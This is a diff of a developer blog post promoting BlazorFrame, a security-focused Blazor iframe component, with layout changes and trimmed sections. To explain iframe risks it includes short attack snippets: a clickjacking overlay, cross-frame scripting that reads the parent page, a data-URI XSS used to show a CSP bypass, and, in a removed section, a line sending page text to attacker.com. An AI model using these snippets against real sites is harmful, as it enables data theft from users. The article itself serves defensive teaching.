@@ -9,7 +9,7 @@
     <link rel="icon" type="image/x-icon" href="/assets/Tim.ico">
     <link rel="shortcut icon" href="/assets/Tim.ico">
     <link rel="apple-touch-icon" sizes="180x180" href="/assets/Tim.ico">
-    <meta name="theme-color" content="#2563eb">
+    <meta name="theme-color" content="#0a0e27">
     
     <!-- SEO Meta Tags -->
     <meta name="description" content="A security-first, enhanced Blazor iframe component that addresses the security landscape of iframes in modern .NET applications. Learn how BlazorFrame provides built-in security features, sandbox controls, and CSP integration.">
@@ -39,8 +39,8 @@
     
     <!-- Twitter Card Meta Tags -->
     <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:site" content="@timmaes_dev">
-    <meta name="twitter:creator" content="@timmaes_dev">
+    <meta name="twitter:site" content="@Tim_Maes_">
+    <meta name="twitter:creator" content="@Tim_Maes_">
     <meta name="twitter:title" content="BlazorFrame: Enhanced iframes in Blazor">
     <meta name="twitter:description" content="A security-first, enhanced Blazor iframe component that addresses the security landscape of iframes in modern .NET applications">
     <meta name="twitter:image" content="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo.png?raw=true">
@@ -50,98 +50,168 @@
     <link rel="canonical" href="https://tim-maes.github.io/blazorframe-enhanced-iframes.html">
     <meta name="robots" content="index, follow">
     
-    <!-- Existing stylesheets and scripts -->
-    <link rel="stylesheet" href="styles.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/default.min.css">
+    <!-- Fonts -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    
+    <!-- Syntax Highlighting -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    
+    <!-- Styles -->
+    <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Header -->
-    <header class="header">
-        <nav class="nav">
+    <!-- Loading Animation -->
+    <div class="loader-wrapper" id="loader">
+        <div class="loader">
+            <div class="loader-cube"></div>
+            <div class="loader-cube"></div>
+            <div class="loader-cube"></div>
+            <div class="loader-cube"></div>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="navbar" id="navbar">
+        <div class="nav-container">
             <div class="nav-brand">
-                <div class="logo">
-                    <div class="shield-icon"></div>
-                    <span>Tim Maes</span>
-                </div>
+                <a href="index.html" style="text-decoration: none; color: inherit;">
+                    <span class="brand-text">Tim<span class="accent">Maes</span></span>
+                </a>
             </div>
-            <ul class="nav-menu">
+            
+            <ul class="nav-menu" id="nav-menu">
                 <li><a href="index.html" class="nav-link">Home</a></li>
-                <li><a href="blog.html" class="nav-link active">Blog</a></li>
-                <li><a href="projects.html" class="nav-link">Projects</a></li>
                 <li><a href="index.html#about" class="nav-link">About</a></li>
+                <li><a href="projects.html" class="nav-link">Projects</a></li>
+                <li><a href="blog.html" class="nav-link active">Blog</a></li>
+                <li><a href="index.html#contact" class="nav-link">Contact</a></li>
                 <li><a href="resume.html" class="nav-link">Resume</a></li>
             </ul>
-            <div class="hamburger">
-                <span></span>
-                <span></span>
-                <span></span>
+
+            <div class="nav-toggle" id="nav-toggle">
+                <span class="bar"></span>
+                <span class="bar"></span>
+                <span class="bar"></span>
             </div>
-        </nav>
-    </header>
+        </div>
+    </nav>
 
     <!-- Article Header -->
     <section class="article-header">
         <div class="container">
-            <div class="article-meta">
-                <span class="article-date">July 13th, 2025</span>
-                <span class="article-category">Blazor</span>
-                <span class="article-category">iframe</span>
+            <div class="article-header-bg">
+                <div class="article-particles"></div>
             </div>
-            <h1 class="article-title">BlazorFrame: Enhanced iframes in Blazor</h1>
-            <p class="article-subtitle">
-                A security-first, enhanced Blazor iframe component that addresses the security landscape of iframes in modern .NET applications
-            </p>
+            
+            <div class="article-header-content">
+                <div class="article-breadcrumb">
+                    <a href="index.html">Home</a>
+                    <span>/</span>
+                    <a href="blog.html">Blog</a>
+                    <span>/</span>
+                    <span>BlazorFrame: Enhanced iframes in Blazor</span>
+                </div>
+                
+                <div class="article-meta">
+                    <span class="article-date">July 13, 2025</span>
+                    <span class="article-category">Blazor</span>
+                    <span class="article-read-time">8 min read</span>
+                </div>
+                
+                <h1 class="article-title">BlazorFrame: Enhanced iframes in Blazor</h1>
+                <p class="article-subtitle">
+                    A security-first, enhanced Blazor iframe component that addresses the security landscape of iframes in modern .NET applications
+                </p>
+                
+                <div class="article-tags">
+                    <span>Blazor</span>
+                    <span>Security</span>
+                    <span>iframes</span>
+                    <span>Web Safety</span>
+                </div>
+                
+                <div class="article-author">
+                    <img src="assets/Tim.jpg" alt="Tim Maes" class="author-photo">
+                    <div class="author-info">
+                        <span class="author-name">Tim Maes</span>
+                        <span class="author-title">.NET Developer & Open Source Contributor</span>
+                    </div>
+                </div>
+            </div>
         </div>
     </section>
 
     <!-- Article Content -->
     <article class="article-content">
         <div class="container">
-            <div class="article-body">
-                <div style="text-align: center; margin: 2rem 0;">
-                    <a href="https://www.github.com/Tim-Maes/BlazorFrame" target="_blank">
-                        <img src="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo.png?raw=true"
-                             alt="BlazorFrame Logo"
-                             style="max-width: 100%; width: 800px;" />
-                    </a>
-                </div>
+            <div class="article-layout">
+                <!-- Table of Contents -->
+                <aside class="article-toc">
+                    <h3>Table of Contents</h3>
+                    <nav class="toc-nav">
+                        <ul>
+                            <li><a href="#what-are-iframes">What are iframes?</a></li>
+                            <li><a href="#security-vulnerabilities">Security vulnerabilities</a></li>
+                            <li><a href="#blazor-complexity">Blazor complexity</a></li>
+                            <li><a href="#blazorframe-solution">BlazorFrame solution</a></li>
+                            <li><a href="#real-world-scenarios">Real-world scenarios</a></li>
+                            <li><a href="#best-practices">Best practices</a></li>
+                        </ul>
+                    </nav>
+                </aside>
+                
+                <!-- Main Article Body -->
+                <div class="article-body">
+                    <div style="text-align: center; margin: 2rem 0;">
+                        <a href="https://www.github.com/Tim-Maes/BlazorFrame" target="_blank">
+                            <img src="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo.png?raw=true"
+                                 alt="BlazorFrame Logo"
+                                 style="max-width: 100%; width: 300px; border-radius: var(--radius-lg);" />
+                        </a>
+                    </div>
 
-                <p>Iframes (inline frames) are one of the most powerful yet dangerous features of the modern web. They allow us to embed third-party content into our applications, but they also open the door to a host of security vulnerabilities that can compromise our users and data.</p>
+                    <p>Iframes (inline frames) are one of the most powerful yet dangerous features of the modern web. They allow us to embed third-party content into our applications, but they also open the door to a host of security vulnerabilities that can compromise our users and data.</p>
 
-                <p>As I was implementing an iframe for a project, I was surprised there was no solution for this available. Many Blazor component libraries are available, yet none had a solution for an iframe component. This is why I started working on a custom wrapper.</p>
+                    <p>As I was implementing an iframe for a project, I was surprised there was no solution for this available. Many Blazor component libraries are available, yet none had a solution for an iframe component. This is why I started working on a custom wrapper.</p>
 
-                <p>In this post, we'll explore the security landscape of iframes, examine how they work in Blazor applications, and explain how <strong>BlazorFrame</strong> provides a security-first solution for modern .NET developers.</p>
+                    <blockquote>
+                        <p>In this post, we'll explore the security landscape of iframes, examine how they work in Blazor applications, and explain how <strong>BlazorFrame</strong> provides a security-first solution for modern .NET developers.</p>
+                    </blockquote>
 
-                <h2>What are iframes and why do we need them?</h2>
+                    <section id="what-are-iframes">
+                        <h2>What are iframes and why do we need them?</h2>
 
-                <p>An iframe is an HTML element that allows you to embed another HTML document within the current page. Think of it as a window into another website or application that lives inside your own page.</p>
+                        <p>An iframe is an HTML element that allows you to embed another HTML document within the current page. Think of it as a window into another website or application that lives inside your own page.</p>
 
-                <pre><code class="language-html">&lt;!-- Basic iframe - simple but dangerous --&gt;
+                        <pre><code class="language-html">&lt;!-- Basic iframe - simple but dangerous --&gt;
 &lt;iframe src="https://example.com" width="100%" height="400px"&gt;&lt;/iframe&gt;</code></pre>
 
-                <p>Iframes are everywhere in modern web development:</p>
-                <ul>
-                    <li><strong>Payment processors</strong> (Stripe, PayPal checkout forms)</li>
-                    <li><strong>Social media widgets</strong> (Twitter embeds, Facebook comments)</li>
-                    <li><strong>Analytics dashboards</strong> (Google Analytics, third-party reporting tools)</li>
-                    <li><strong>Maps and location services</strong> (Google Maps, Mapbox)</li>
-                    <li><strong>Video players</strong> (YouTube, Vimeo embeds)</li>
-                    <li><strong>Chat widgets</strong> (Customer support, live chat)</li>
-                </ul>
+                        <p>Iframes are everywhere in modern web development:</p>
+                        <ul>
+                            <li><strong>Payment processors</strong> (Stripe, PayPal checkout forms)</li>
+                            <li><strong>Social media widgets</strong> (Twitter embeds, Facebook comments)</li>
+                            <li><strong>Analytics dashboards</strong> (Google Analytics, third-party reporting tools)</li>
+                            <li><strong>Maps and location services</strong> (Google Maps, Mapbox)</li>
+                            <li><strong>Video players</strong> (YouTube, Vimeo embeds)</li>
+                            <li><strong>Chat widgets</strong> (Customer support, live chat)</li>
+                        </ul>
 
-                <p>Without iframes, we'd need to redirect users away from our applications or rebuild complex functionality from scratch. They are often essential for creating rich, integrated user experiences.</p>
+                        <p>Without iframes, we'd need to redirect users away from our applications or rebuild complex functionality from scratch. They are often essential for creating rich, integrated user experiences.</p>
+                    </section>
 
-                <h2>The darker side: iframe security vulnerabilities</h2>
+                    <section id="security-vulnerabilities">
+                        <h2>The darker side: iframe security vulnerabilities</h2>
 
-                <p>However, iframes come with significant security risks that many developers overlook. I will list some concrete examples:</p>
+                        <p>However, iframes come with significant security risks that many developers overlook. I will list some concrete examples:</p>
 
-                <h3>1. Clickjacking attacks</h3>
+                        <h3>1. Clickjacking attacks</h3>
 
-                <p>Clickjacking tricks users into clicking on something different from what they perceive. An attacker overlays an invisible iframe containing a legitimate action (like "Delete Account") over a harmless-looking button.</p>
+                        <p>Clickjacking tricks users into clicking on something different from what they perceive. An attacker overlays an invisible iframe containing a legitimate action (like "Delete Account") over a harmless-looking button.</p>
 
-                <pre><code class="language-html">&lt;!-- Malicious page --&gt;
+                        <pre><code class="language-html">&lt;!-- Malicious page --&gt;
 &lt;style&gt;
   .invisible-iframe {
     position: absolute;
@@ -155,11 +225,11 @@
 &lt;button&gt;Win a Free iPhone!&lt;/button&gt;
 &lt;iframe src="https://bank.com/transfer-money" class="invisible-iframe"&gt;&lt;/iframe&gt;</code></pre>
 
-                <h3>2. Cross-Frame scripting (XFS)</h3>
+                        <h3>2. Cross-Frame scripting (XFS)</h3>
 
-                <p>When iframes can execute JavaScript, they may access or manipulate the parent page's DOM, steal data, or perform actions on behalf of the user.</p>
+                        <p>When iframes can execute JavaScript, they may access or manipulate the parent page's DOM, steal data, or perform actions on behalf of the user.</p>
 
-                <pre><code class="language-javascript">// Malicious iframe code
+                        <pre><code class="language-javascript">// Malicious iframe code
 if (parent !== window) {
   // Access parent window data
   var userData = parent.document.getElementById('user-data').innerText;
@@ -171,71 +241,37 @@ if (parent !== window) {
   });
 }</code></pre>
 
-                <h3>3. Unvalidated postMessage communication</h3>
+                        <div class="code-callout">
+                            <h4>⚠️ Security Warning</h4>
+                            <p>Unvalidated postMessage communication can lead to severe security vulnerabilities. Always validate origin and content of iframe messages.</p>
+                        </div>
 
-                <p>Modern web applications use <code>postMessage</code> for secure cross-frame communication, but without proper validation, this becomes a vulnerability:</p>
+                        <h3>3. Content Security Policy (CSP) bypass</h3>
 
-                <pre><code class="language-javascript">// Vulnerable code - accepts messages from any origin
-window.addEventListener('message', function(event) {
-  // DANGEROUS: No origin validation
-  if (event.data.action === 'updateUser') {
-    updateUserProfile(event.data.userData);
-  }
-});</code></pre>
+                        <p>Poorly configured CSP policies can be bypassed through iframes, allowing malicious scripts to execute:</p>
 
-                <h3>4. Content Security Policy (CSP) bypass</h3>
-
-                <p>Poorly configured CSP policies can be bypassed through iframes, allowing malicious scripts to execute:</p>
-
-                <pre><code class="language-html">&lt;!-- CSP: script-src 'self' --&gt;
+                        <pre><code class="language-html">&lt;!-- CSP: script-src 'self' --&gt;
 &lt;!-- This bypasses CSP if iframe sources aren't restricted --&gt;
 &lt;iframe src="data:text/html,&lt;script&gt;alert('XSS')&lt;/script&gt;"&gt;&lt;/iframe&gt;</code></pre>
+                    </section>
 
-                <h3>5. Data exfiltration</h3>
+                    <section id="blazor-complexity">
+                        <h2>Blazor and iframes: A match made in... complexity</h2>
 
-                <p>Iframes can be used to exfiltrate sensitive data through various techniques:</p>
+                        <p>Blazor Server and Blazor WebAssembly (WASM) both have unique considerations when working with iframes:</p>
 
-                <pre><code class="language-javascript">// Iframe reads sensitive data and sends it elsewhere
-var sensitiveData = document.body.innerText;
-var img = new Image();
-img.src = 'https://attacker.com/log?data=' + encodeURIComponent(sensitiveData);</code></pre>
+                        <h3>Blazor Server challenges</h3>
 
-                <p>Yet, the vast majority of iframes, are windows to public sites or URLs, don't require any user interaction or authentication. A small set of enterprise applications, do face this issue, and most probably always write their own implementation of a iframe wrapper in some way or form.</p>
+                        <p><strong>SignalR Connection Security</strong>: Blazor Server maintains a persistent SignalR connection. Malicious iframes could potentially:</p>
+                        <ul>
+                            <li>Intercept SignalR messages</li>
+                            <li>Trigger unwanted server calls</li>
+                            <li>Consume server resources</li>
+                        </ul>
 
-                <h2>Blazor and iframes: A match made in... complexity</h2>
+                        <h3>Common Blazor iframe pitfalls</h3>
 
-                <p>Blazor Server and Blazor WebAssembly (WASM) both have unique considerations when working with iframes:</p>
-
-                <h3>Blazor Server challenges</h3>
-
-                <p><strong>SignalR Connection Security</strong>: Blazor Server maintains a persistent SignalR connection. Malicious iframes could potentially:</p>
-                <ul>
-                    <li>Intercept SignalR messages</li>
-                    <li>Trigger unwanted server calls</li>
-                    <li>Consume server resources</li>
-                </ul>
-
-                <p><strong>Server-Side state</strong>: Since UI state lives on the server, iframe interactions could lead to:</p>
-                <ul>
-                    <li>State corruption</li>
-                    <li>Unauthorized state access</li>
-                    <li>Memory leaks from unmanaged iframe lifecycles</li>
-                </ul>
-
-                <h3>Blazor WASM challenges</h3>
-
-                <p><strong>Client-Side vulnerabilities</strong>: WASM applications run entirely in the browser, making them susceptible to:</p>
-                <ul>
-                    <li>Client-side data theft</li>
-                    <li>Local storage manipulation</li>
-                    <li>Authentication token extraction</li>
-                </ul>
-
-                <p><strong>Assembly inspection</strong>: Unlike server-side code, WASM assemblies can be inspected, making security through obscurity impossible.</p>
-
-                <h3>Common Blazor iframe pitfalls</h3>
-
-                <pre><code class="language-razor">@* DANGEROUS: No security considerations *@
+                        <pre><code class="language-razor">@* DANGEROUS: No security considerations *@
 &lt;iframe src="@ThirdPartyUrl" width="100%" height="400px"&gt;&lt;/iframe&gt;
 
 @code {
@@ -243,19 +279,21 @@ img.src = 'https://attacker.com/log?data=' + encodeURIComponent(sensitiveData);<
     private string ThirdPartyUrl = "https://example.com";
 }</code></pre>
 
-                <p>The standard Blazor approach of implementing iframes provides no built-in security, leaving developers to implement security measures manually - often incompletely or incorrectly.</p>
+                        <p>The standard Blazor approach of implementing iframes provides no built-in security, leaving developers to implement security measures manually - often incompletely or incorrectly.</p>
+                    </section>
 
-                <h2>BlazorFrame: Security-first iframe management</h2>
+                    <section id="blazorframe-solution">
+                        <h2>BlazorFrame: Security-first iframe management</h2>
 
-                <p>This is where <strong>BlazorFrame</strong> comes in. BlazorFrame is a comprehensive Blazor component library that addresses iframe security concerns while providing a seamless developer experience.</p>
+                        <p>This is where <strong>BlazorFrame</strong> comes in. BlazorFrame is a comprehensive Blazor component library that addresses iframe security concerns while providing a seamless developer experience.</p>
 
-                <h3>Key Security Features</h3>
+                        <h3>Key Security Features</h3>
 
-                <h4>1. Automatic Origin Validation</h4>
+                        <h4>1. Automatic Origin Validation</h4>
 
-                <p>BlazorFrame automatically validates the origin of all iframe messages:</p>
+                        <p>BlazorFrame automatically validates the origin of all iframe messages:</p>
 
-                <pre><code class="language-razor">@using BlazorFrame
+                        <pre><code class="language-razor">@using BlazorFrame
 
 &lt;BlazorFrame Src="https://widget.example.com"
             OnValidatedMessage="HandleMessage"
@@ -277,11 +315,11 @@ img.src = 'https://attacker.com/log?data=' + encodeURIComponent(sensitiveData);<
     }
 }</code></pre>
 
-                <h4>2. Multiple Sandbox Security Levels</h4>
+                        <h4>2. Multiple Sandbox Security Levels</h4>
 
-                <p>BlazorFrame provides five distinct sandbox security levels:</p>
+                        <p>BlazorFrame provides five distinct sandbox security levels:</p>
 
-                <pre><code class="language-csharp">// For untrusted content - maximum security
+                        <pre><code class="language-csharp">// For untrusted content - maximum security
 var paranoidOptions = new MessageSecurityOptions()
     .ForProduction()
     .WithParanoidSandbox();  // Scripts only, no forms, no popups
@@ -295,66 +333,16 @@ var paymentOptions = new MessageSecurityOptions()
 var trustedOptions = new MessageSecurityOptions()
     .ForDevelopment()
     .WithPermissiveSandbox();</code></pre>
+                    </section>
 
-                <h4>3. Content Security Policy Integration</h4>
+                    <section id="real-world-scenarios">
+                        <h2>Real-World security scenarios</h2>
 
-                <p>BlazorFrame generates and validates CSP headers automatically:</p>
+                        <p>Let's examine how BlazorFrame handles common security challenges:</p>
 
-                <pre><code class="language-razor">&lt;BlazorFrame Src="https://widget.example.com"
-            CspOptions="@cspOptions"
-            OnCspHeaderGenerated="HandleCspGenerated" /&gt;
+                        <h3>Scenario 1: Payment widget integration</h3>
 
-@code {
-    private readonly CspOptions cspOptions = new CspOptions()
-        .ForProduction()
-        .AllowFrameSources("https://widget.example.com")
-        .WithScriptNonce("secure-nonce-123");
-        
-    private Task HandleCspGenerated(CspHeader cspHeader)
-    {
-        // Apply CSP header to HTTP response
-        HttpContext.Response.Headers.Add(
-            cspHeader.HeaderName, 
-            cspHeader.HeaderValue
-        );
-        return Task.CompletedTask;
-    }
-}</code></pre>
-
-                <h4>4. Message Size and Content Validation</h4>
-
-                <p>All iframe communication is validated for size and content:</p>
-
-                <pre><code class="language-csharp">var securityOptions = new MessageSecurityOptions
-{
-    EnableStrictValidation = true,
-    MaxMessageSize = 32 * 1024,  // 32KB limit
-    LogSecurityViolations = true
-};</code></pre>
-
-                <h4>5. Environment-Aware Security</h4>
-
-                <p>BlazorFrame automatically adjusts security settings based on your environment:</p>
-
-                <pre><code class="language-csharp">// Development - relaxed for debugging
-var devOptions = new MessageSecurityOptions()
-    .ForDevelopment()
-    .WithPermissiveSandbox();
-
-// Production - strict security
-var prodOptions = new MessageSecurityOptions()
-    .ForProduction()
-    .WithStrictSandbox()
-    .RequireHttps()
-    .ValidateAndThrow();</code></pre>
-
-                <h2>Real-World security scenarios</h2>
-
-                <p>Let's examine how BlazorFrame handles common security challenges:</p>
-
-                <h3>Scenario 1: Payment widget integration</h3>
-
-                <pre><code class="language-razor">@page "/checkout"
+                        <pre><code class="language-razor">@page "/checkout"
 
 &lt;h3&gt;Secure Payment Processing&lt;/h3&gt;
 
@@ -380,79 +368,17 @@ var prodOptions = new MessageSecurityOptions()
             await ProcessPayment(message.Data);
         }
     }
-
-    private async Task HandlePaymentViolation(IframeMessage violation)
-    {
-        // Log security violation for fraud detection
-        logger.LogCritical("Payment security violation: {Error}", violation.ValidationError);
-        
-        // Notify security team
-        await securityService.ReportViolation(violation);
-    }
 }</code></pre>
+                    </section>
 
-                <h3>Scenario 2: Customer Support Chat Widget</h3>
+                    <section id="best-practices">
+                        <h2>Best practices for secure iframe usage</h2>
 
-                <pre><code class="language-razor">@page "/support"
+                        <p>Based on the capabilities of BlazorFrame, here are essential best practices:</p>
 
-&lt;h3&gt;Live Support Chat&lt;/h3&gt;
+                        <h3>1. Always use sandbox attributes</h3>
 
-&lt;BlazorFrame Src="@chatWidgetUrl"
-            SecurityOptions="@chatSecurity"
-            EnableAutoResize="true"
-            OnValidatedMessage="HandleChatMessage" /&gt;
-
-@code {
-    private readonly string chatWidgetUrl = "https://chat.support.com/widget";
-    
-    private readonly MessageSecurityOptions chatSecurity = new MessageSecurityOptions()
-        .ForProduction()
-        .WithBasicSandbox()       // Allow forms and same-origin
-        .AllowOrigin("https://chat.support.com")
-        .WithMaxMessageSize(64 * 1024);  // Allow larger messages for chat
-
-    private async Task HandleChatMessage(IframeMessage message)
-    {
-        switch (message.MessageType)
-        {
-            case "chat_started":
-                await analyticsService.TrackEvent("SupportChatStarted");
-                break;
-            case "resize_request":
-                // BlazorFrame handles this automatically
-                break;
-        }
-    }
-}</code></pre>
-
-                <h2>Performance and Auto-Resizing</h2>
-
-                <p>Beyond security, BlazorFrame provides intelligent auto-resizing capabilities:</p>
-
-                <pre><code class="language-razor">&lt;BlazorFrame Src="https://dynamic-content.com"
-            EnableAutoResize="true"    &lt;!-- Smart height adjustment --&gt;
-            EnableScroll="false"       &lt;!-- No scrollbars needed --&gt;
-            OnValidatedMessage="HandleResize" /&gt;
-
-@code {
-    private Task HandleResize(IframeMessage message)
-    {
-        if (message.MessageType == "resize")
-        {
-            // BlazorFrame automatically handles height adjustment
-            // Uses ResizeObserver when available, falls back to polling
-        }
-        return Task.CompletedTask;
-    }
-}</code></pre>
-
-                <h2>Best practices for secure iframe usage</h2>
-
-                <p>Based on the capabilities of BlazorFrame, here are essential best practices:</p>
-
-                <h3>1. Always use sandbox attributes</h3>
-
-                <pre><code class="language-csharp">// Good: Explicitly configure sandbox
+                        <pre><code class="language-csharp">// Good: Explicitly configure sandbox
 var options = new MessageSecurityOptions()
     .WithStrictSandbox()      // Scripts + same-origin only
     .RequireHttps();
@@ -460,9 +386,9 @@ var options = new MessageSecurityOptions()
 // Bad: No sandbox restrictions
 var options = new MessageSecurityOptions(); // Uses defaults</code></pre>
 
-                <h3>2. Validate all Origins</h3>
+                        <h3>2. Validate all Origins</h3>
 
-                <pre><code class="language-csharp">// Good: Explicit origin validation
+                        <pre><code class="language-csharp">// Good: Explicit origin validation
 var options = new MessageSecurityOptions()
     .AllowOrigin("https://trusted-widget.com")
     .AllowOrigin("https://api.trusted-widget.com");
@@ -471,157 +397,743 @@ var options = new MessageSecurityOptions()
 var options = new MessageSecurityOptions()
     .AllowOrigin("*");  // NEVER do this</code></pre>
 
-                <h3>3. Environment-Specific configuration</h3>
+                        <div class="code-callout">
+                            <h4>💡 Pro Tip</h4>
+                            <p>Always use environment-specific configurations. What works in development might be dangerous in production.</p>
+                        </div>
+                    </section>
 
-                <pre><code class="language-csharp">public class IframeSecurityService
-{
-    public MessageSecurityOptions GetSecurityOptions(IWebHostEnvironment env)
-    {
-        if (env.IsDevelopment())
-        {
-            return new MessageSecurityOptions()
-                .ForDevelopment()
-                .WithPermissiveSandbox()
-                .Validate();  // Warn but don't throw
-        }
-        
-        return new MessageSecurityOptions()
-            .ForProduction()
-            .WithStrictSandbox()
-            .RequireHttps()
-            .ValidateAndThrow();  // Fail fast in production
-    }
-}</code></pre>
+                    <h2>Conclusion</h2>
 
-                <h3>4. Monitor security violations</h3>
+                    <p>Iframes are a powerful tool for creating rich, integrated web experiences, but they come with significant security risks that require careful attention. The traditional approach of manually implementing iframe security is error-prone and often incomplete.</p>
 
-                <pre><code class="language-csharp">private async Task HandleSecurityViolation(IframeMessage violation)
-{
-    // Log for security monitoring
-    logger.LogWarning("Iframe security violation: {Error} from {Origin}", 
-        violation.ValidationError, violation.Origin);
-    
-    // Track violations in metrics
-    await metricsService.IncrementCounter("iframe.security.violations", 
-        new[] { ("origin", violation.Origin), ("error_type", violation.MessageType) });
-    
-    // Notify security team for repeated violations
-    if (await IsRepeatedViolator(violation.Origin))
-    {
-        await securityService.BlockOrigin(violation.Origin);
-    }
-}</code></pre>
+                    <p>BlazorFrame represents a paradigm shift toward security-first iframe management in Blazor applications. By providing built-in origin validation, sandbox security levels, CSP integration, and comprehensive monitoring, it allows developers to leverage the power of iframes without compromising security.</p>
 
-                <h2>The Future of secure iframe integration</h2>
+                    <p>Whether you're embedding payment widgets, customer support tools, or analytics dashboards, BlazorFrame provides the security foundation you need to protect your users and your business.</p>
 
-                <p>As web applications become more complex and security threats evolve, libraries like BlazorFrame represent the future of secure iframe integration:</p>
+                    <!-- Additional Resources -->
+                    <section class="resources-section">
+                        <h2>Additional Resources</h2>
+                        <div class="resources-grid">
+                            <div class="resource-item">
+                                <h4>📚 Documentation</h4>
+                                <ul>
+                                    <li><a href="https://github.com/Tim-Maes/BlazorFrame/blob/master/docs/readme.md" target="_blank">Complete Documentation</a></li>
+                                    <li><a href="https://github.com/Tim-Maes/BlazorFrame/blob/master/docs/security.md" target="_blank">Security Guide</a></li>
+                                    <li><a href="https://github.com/Tim-Maes/BlazorFrame/blob/master/docs/examples.md" target="_blank">Code Examples</a></li>
+                                </ul>
+                            </div>
+                            
+                            <div class="resource-item">
+                                <h4>🔗 Project Links</h4>
+                                <ul>
+                                    <li><a href="https://github.com/Tim-Maes/BlazorFrame" target="_blank">GitHub Repository</a></li>
+                                    <li><a href="https://www.nuget.org/packages/BlazorFrame" target="_blank">NuGet Package</a></li>
+                                    <li><a href="https://github.com/Tim-Maes/BlazorFrameDemo" target="_blank">Interactive Demo</a></li>
+                                </ul>
+                            </div>
+                            
+                            <div class="resource-item">
+                                <h4>📦 Related Tools</h4>
+                                <ul>
+                                    <li><a href="projects.html">Other Projects</a></li>
+                                    <li><a href="facets-in-dotnet.html">Facet Code Generator</a></li>
+                                    <li><a href="blog.html">More Articles</a></li>
+                                </ul>
+                            </div>
+                        </div>
+                    </section>
+                </div>
+            </div>
 
-                <ul>
-                    <li><strong>Zero-Trust by Default</strong>: Assume all iframe content is malicious until proven otherwise</li>
-                    <li><strong>Automated Security</strong>: Let libraries handle complex security logic</li>
-                    <li><strong>Environment Awareness</strong>: Different security postures for different environments</li>
-                    <li><strong>Comprehensive Monitoring</strong>: Track and respond to security violations</li>
-                    <li><strong>Developer-Friendly</strong>: Security that doesn't compromise productivity</li>
-                </ul>
-
-                <h2>Conclusion</h2>
-
-                <p>Iframes are a powerful tool for creating rich, integrated web experiences, but they come with significant security risks that require careful attention. The traditional approach of manually implementing iframe security is error-prone and often incomplete.</p>
-
-                <p>I hope my solution represents a paradigm shift toward security-first iframe management in Blazor applications. By providing built-in origin validation, sandbox security levels, CSP integration, and comprehensive monitoring, it allows developers to leverage the power of iframes without compromising security.</p>
-
-                <p>Whether you're embedding payment widgets, customer support tools, or analytics dashboards, BlazorFrame provides the security foundation you need to protect your users and your business.</p>
-
-                <p>The web is a dangerous place, but with the right tools and practices, we can build secure, robust applications that leverage the best of what the internet has to offer.</p>
-
-                <h2>Resources</h2>
-
-                <ul>
-                    <li><strong>BlazorFrame Documentation</strong>: <a href="https://github.com/Tim-Maes/BlazorFrame/blob/master/docs/readme.md" target="_blank">Complete documentation and examples</a></li>
-                    <li><strong>NuGet Package</strong>: <a href="https://www.nuget.org/packages/BlazorFrame" target="_blank">Install BlazorFrame</a></li>
-                    <li><strong>Source Code</strong>: <a href="https://github.com/Tim-Maes/BlazorFrame" target="_blank">GitHub Repository</a></li>
-                    <li><strong>Interactive Demo</strong>: <a href="https://github.com/Tim-Maes/BlazorFrameDemo" target="_blank">Try BlazorFrame live</a></li>
-                </ul>
-
-                <div style="text-align: center; margin: 2rem 0;">
-                    <a href="https://www.github.com/Tim-Maes/BlazorFrame" target="_blank">
-                        <img src="https://github.com/Tim-Maes/BlazorFrame/blob/master/assets/BlazorFrameLogo2.png?raw=true"
-                             alt="BlazorFrame Logo"
-                             style="max-width: 100%; width: 200px;" />
+            <!-- Article Footer -->
+            <div class="article-footer">
+                <div class="article-sharing">
+                    <h3>Share this article</h3>
+                    <div class="sharing-buttons">
+                        <a href="https://twitter.com/intent/tweet?text=BlazorFrame: Enhanced iframes in Blazor&url=https://tim-maes.github.io/blazorframe-enhanced-iframes.html&via=Tim_Maes_" class="share-btn twitter" target="_blank">
+                            <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                                <path d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z"/>
+                            </svg>
+                            Twitter
+                        </a>
+                        <a href="https://www.linkedin.com/sharing/share-offsite/?url=https://tim-maes.github.io/blazorframe-enhanced-iframes.html" class="share-btn linkedin" target="_blank">
+                            <svg width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
